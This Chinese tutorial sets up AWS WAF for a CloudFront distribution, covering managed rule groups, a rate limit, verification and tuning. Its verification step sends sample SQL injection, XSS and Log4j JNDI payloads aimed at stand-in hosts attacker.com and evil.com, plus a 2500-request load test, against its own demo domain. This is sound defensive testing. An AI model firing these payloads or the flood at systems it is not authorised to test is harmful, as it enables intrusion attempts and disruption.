| 同一 Behavior 关联第二个 Function 报错 | 同一 Event type 只能关联一个 Function | 将多个逻辑合并到同一个 Function 中 |
| URL 重写后 404 | 重写后的路径没有匹配到正确的 Behavior 或 Origin | 检查 Behavior 路径优先级和 Origin 路由配置 |
| 地理重定向无限循环 | 重定向目标路径也匹配了重定向规则 | 确认代码中排除了 `/cn/` 前缀路径 |
| `cloudfront-viewer-country` 为空 | 未在 Cache Policy 中启用地理 header | 使用 cloudfront-js-2.0 运行时可直接读取，无需额外配置 |
```

---

### Step 16.4: 创建 `docs/hands-on/04-cloudfront-waf-basic.md`

- [ ] 创建文件 `docs/hands-on/04-cloudfront-waf-basic.md`

```markdown
# 04 - CloudFront WAF 基础防护：Web ACL 与托管规则

> **目标**: 在 us-east-1 创建 WAF Web ACL，添加 AWS 托管规则（Common Rule Set、Known Bad Inputs、IP Reputation）和自定义速率限制规则，关联到 CloudFront Distribution。
>
> **预计时间**: 25-35 分钟
>
> **前提条件**:
> - 已完成文档 01（Distribution 已创建并部署）

---

## 重要前提：WAF 区域要求

> **CloudFront 的 WAF Web ACL 必须创建在 us-east-1 区域**。这是因为 CloudFront 是全球服务，其控制平面位于 us-east-1。在其他区域创建的 Web ACL 无法关联到 CloudFront Distribution。

---

## 步骤 1: 创建 WAF Web ACL

- [ ] 打开 **AWS WAF Console**（确保区域切换到 **US East (N. Virginia) us-east-1**）
- [ ] 左侧菜单 **Web ACLs** → **Create web ACL**

### 1.1 基本配置

| 参数 | 值 |
|------|-----|
| Resource type | **Amazon CloudFront distributions** |
| Region | **Global (CloudFront)** — 选择 CloudFront 后自动设定 |
| Name | `unice-demo-waf` |
| Description | `WAF protection for unice CloudFront demo platform` |
| CloudWatch metric name | `unice-demo-waf`（自动填入） |

- [ ] 点击 **Next**

### 1.2 添加规则和规则组

按以下顺序添加 4 条规则：

#### 规则 1: AWS Common Rule Set（OWASP Top 10 防护）

- [ ] 点击 **Add rules** → **Add managed rule groups**
- [ ] 展开 **AWS managed rule groups** → 开启 **Core rule set** (AWSManagedRulesCommonRuleSet)
- [ ] 点击 **Edit** 进入详细配置：

| 参数 | 值 |
|------|-----|
| Override rule group action to Count | **Yes**（建议初始设为 Count 模式观察） |

> **说明**: Common Rule Set 包含约 30 条规则，覆盖 SQL 注入、XSS、SSRF、文件包含等 OWASP Top 10 攻击。初始使用 Count 模式可以在 CloudWatch 中观察匹配情况，确认无误报后再切换为 Block。

- [ ] 点击 **Save rule**

#### 规则 2: AWS Known Bad Inputs（已知恶意输入检测）

- [ ] 继续在 **Add managed rule groups** 页面
- [ ] 开启 **Known bad inputs** (AWSManagedRulesKnownBadInputsRuleSet)

| 参数 | 值 |
|------|-----|
| Override rule group action to Count | **No**（直接 Block） |

> **说明**: 检测 Log4j (CVE-2021-44228) 漏洞利用、恶意 User-Agent 等已知恶意输入模式。由于这些是已确认的攻击模式，可以直接 Block。

- [ ] 点击 **Save rule**

#### 规则 3: AWS IP Reputation List（恶意 IP 信誉库）

- [ ] 继续在 **Add managed rule groups** 页面
- [ ] 开启 **Amazon IP reputation list** (AWSManagedRulesAmazonIpReputationList)

| 参数 | 值 |
|------|-----|
| Override rule group action to Count | **Yes**（设为 Count 用于监控） |

> **说明**: AWS 维护的恶意 IP 信誉库，包含已知的僵尸网络节点、匿名代理、暗网出口节点等。初始设为 Count 以避免误封合法用户。

- [ ] 点击 **Save rule**
- [ ] 点击 **Add rules**（返回主配置页）

#### 规则 4: 自定义速率限制规则

- [ ] 点击 **Add rules** → **Add my own rules and rule groups**
- [ ] 选择 **Rule builder**

| 参数 | 值 |
|------|-----|
| Name | `RateLimitPerIP` |
| Type | **Rate-based rule** |
| Rate limit | `2000` |
| Evaluation window | **5 minutes** |
| Request aggregation | **Source IP address** |
| Scope of inspection and rate limiting | **Consider all requests** |
| Action | **Block** |

> **说明**: 同一 IP 在 5 分钟内超过 2000 次请求将被封禁。这可以防止暴力破解攻击和简单的 DDoS。封禁会在速率降到阈值以下后自动解除。

- [ ] 点击 **Add rule**

### 1.3 设置规则优先级

- [ ] 调整规则优先级（从上到下执行，数字越小优先级越高）：

| 优先级 | 规则名称 | 动作 |
|--------|----------|------|
| 1 | AWSManagedRulesCommonRuleSet | Count |
| 2 | AWSManagedRulesKnownBadInputsRuleSet | Block |
| 3 | AWSManagedRulesAmazonIpReputationList | Count |
| 4 | RateLimitPerIP | Block |

- [ ] 设置 **Default web ACL action for requests that don't match any rules** 为 **Allow**
- [ ] 点击 **Next**

### 1.4 配置 CloudWatch Metrics

- [ ] 保持每条规则的 CloudWatch metric 为默认值
- [ ] 确认 **Request sampling options** 为 **Enable sampled requests**

- [ ] 点击 **Next**

### 1.5 Review 并创建

- [ ] 检查所有配置无误
- [ ] 点击 **Create web ACL**

---

## 步骤 2: 将 WAF Web ACL 关联到 CloudFront

- [ ] 打开 **CloudFront Console** → 选择 Distribution → **General** 标签 → **Edit settings**
- [ ] 在 **AWS WAF web ACL** 下拉菜单中选择 `unice-demo-waf`
- [ ] 点击 **Save changes**
- [ ] 等待 Distribution 状态变为 **Deployed**

> **备选方式**：也可以在 WAF Console 的 Web ACL 详情页 → **Associated AWS resources** 标签 → **Add AWS resources** → 选择 CloudFront Distribution。

---

## 步骤 3: 验证 WAF 防护

### 3.1 验证正常请求通过

```bash
# 正常请求 - 应该返回 200
curl -s -o /dev/null -w "%{http_code}" https://unice.keithyu.cloud/api/health
```

- [ ] 确认返回 `200`

### 3.2 验证 SQL 注入防护（Common Rule Set）

```bash
# 模拟 SQL 注入攻击
curl -s -o /dev/null -w "%{http_code}" \
  "https://unice.keithyu.cloud/api/products?id=1%27%20OR%201%3D1%20--"

# 模拟 XSS 攻击
curl -s -o /dev/null -w "%{http_code}" \
  "https://unice.keithyu.cloud/api/products?q=<script>alert(1)</script>"
```

- [ ] 如果 Common Rule Set 设为 Count 模式，请求仍返回 200，但在 WAF Dashboard 中可以看到匹配记录
- [ ] 如果切换为 Block 模式，返回 `403`

### 3.3 验证 Known Bad Inputs（Log4j 防护）

```bash
# 模拟 Log4j 漏洞利用请求
curl -s -o /dev/null -w "%{http_code}" \
  -H "User-Agent: \${jndi:ldap://attacker.com/exploit}" \
  https://unice.keithyu.cloud/

# 模拟 Log4j 变体攻击
curl -s -o /dev/null -w "%{http_code}" \
  "https://unice.keithyu.cloud/api/products?q=\${jndi:ldap://evil.com/a}"
```

- [ ] 确认返回 `403`（Known Bad Inputs 已设为 Block 模式）

### 3.4 验证速率限制

```bash
# 快速发送大量请求测试速率限制（注意：需要真正触发 2000 次/5分钟才会生效）
# 以下为简化测试，观察效果
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" https://unice.keithyu.cloud/api/health
done
```

- [ ] 正常情况下全部返回 200（50 次远未达到 2000 次阈值）

> **完整速率限制测试**：需要使用压测工具（如 `ab` 或 `hey`）在 5 分钟内发送超过 2000 次请求才能触发封禁：
> ```bash
> # 安装 hey 压测工具
> # brew install hey (macOS) 或 go install github.com/rakyll/hey@latest
> hey -n 2500 -c 50 https://unice.keithyu.cloud/api/health
> ```

---

## 步骤 4: 查看 WAF Dashboard

### 4.1 查看 Web ACL 概览

- [ ] 打开 **WAF Console** (us-east-1) → **Web ACLs** → `unice-demo-waf` → **Overview** 标签

关注以下指标：
- **Allowed requests**: 通过的请求数
- **Blocked requests**: 被拦截的请求数
- **Counted requests**: Count 模式匹配但放行的请求数
- **Bot requests**: 被识别为 Bot 的请求数（启用 Bot Control 后可见）

### 4.2 查看 Sampled Requests

- [ ] **Web ACLs** → `unice-demo-waf` → **Overview** → 向下滚动到 **Sampled requests**
- [ ] 选择时间范围（如 Last 3 hours）
- [ ] 查看匹配到规则的请求样本：

关注字段：
- **Source IP**: 请求来源 IP
- **URI**: 请求路径
- **Matching rule**: 匹配到的规则名称
- **Action**: 执行的动作（Allow/Block/Count）
- **Timestamp**: 请求时间

### 4.3 CloudWatch 监控

- [ ] 打开 **CloudWatch Console** (us-east-1) → **Metrics** → **WAF**
- [ ] 查看 `AllowedRequests`、`BlockedRequests`、`CountedRequests` 指标

> **告警建议**: 在生产环境中，建议为 BlockedRequests 创建 CloudWatch Alarm，当异常封禁量激增时及时通知运维团队。

---

## 步骤 5: 调优建议 — 从 Count 切换到 Block

完成一段时间的观察后（建议至少 24 小时），将 Count 模式的规则切换为 Block：

### 5.1 切换 Common Rule Set 为 Block

- [ ] **Web ACLs** → `unice-demo-waf` → **Rules** 标签
- [ ] 选择 `AWSManagedRulesCommonRuleSet` → **Edit**
- [ ] 取消勾选 **Override rule group action to Count**
- [ ] 如果需要排除个别规则（已确认为误报的规则）：
  - 展开 **Rules** 列表
  - 对误报的规则单独设置 **Override to Count**
- [ ] 点击 **Save rule**

### 5.2 切换 IP Reputation List 为 Block

- [ ] 选择 `AWSManagedRulesAmazonIpReputationList` → **Edit**
- [ ] 取消勾选 **Override rule group action to Count**
- [ ] 点击 **Save rule**

---

## Web ACL 规则总览

| 优先级 | 规则名称 | 类型 | 初始动作 | 最终动作 | 说明 |
|--------|----------|------|----------|----------|------|
| 1 | AWSManagedRulesCommonRuleSet | AWS 托管 | Count | Block | OWASP Top 10 防护 |
| 2 | AWSManagedRulesKnownBadInputsRuleSet | AWS 托管 | Block | Block | Log4j / 恶意输入 |
| 3 | AWSManagedRulesAmazonIpReputationList | AWS 托管 | Count | Block | 恶意 IP 信誉库 |
| 4 | RateLimitPerIP | 自定义 | Block | Block | 2000 次/5 分钟/IP |
| Default | — | — | Allow | Allow | 不匹配任何规则则放行 |

---

## 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| WAF Web ACL 在 CloudFront 下拉菜单中看不到 | Web ACL 未创建在 us-east-1 | 删除重建，确保在 us-east-1 区域创建 |
| 正常请求被误封（403） | Common Rule Set 过于严格 | 在 Sampled Requests 中找到误封的规则 ID，对该规则单独 Override to Count |
| 速率限制太容易触发 | Rate limit 阈值设得太低 | 调高 Rate limit（如 5000 或 10000），根据实际流量调整 |
| WAF 关联 CloudFront 后延迟增加 | WAF 规则评估增加了处理时间 | 正常现象，通常增加 1-3ms。如果规则过多（> 20 条），考虑精简 |
| CloudWatch 中看不到 WAF 指标 | 指标在 us-east-1 区域 | 切换 CloudWatch 到 us-east-1 查看 WAF 相关指标 |
| Block 模式下返回的错误页面不友好 | WAF 默认返回 403 纯文本 | 在 Web ACL 的 **Custom response** 中配置自定义错误响应体 |
```
